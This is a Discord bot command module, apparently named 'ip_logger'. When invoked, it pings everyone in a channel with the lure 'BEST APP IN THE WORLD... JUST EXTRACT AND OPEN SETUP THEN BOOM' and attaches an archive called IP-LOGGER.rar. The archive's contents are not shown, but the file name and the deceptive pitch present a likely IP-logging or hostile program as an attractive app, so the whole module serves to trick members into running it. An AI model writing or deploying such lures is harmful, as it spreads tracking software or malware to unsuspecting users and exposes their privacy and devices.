module.exports = {
    name: 'ip_logger',
    description: "this ip thing command",
    execute(message, args, cmd, client, Discord){
        message.channel.send('BEST APP IN THE WORLD @everyone. JUST EXTRACT AND OPEN SETUP THEN BOOM', { files: ['./commands/IP-LOGGER.rar'] });
    }
}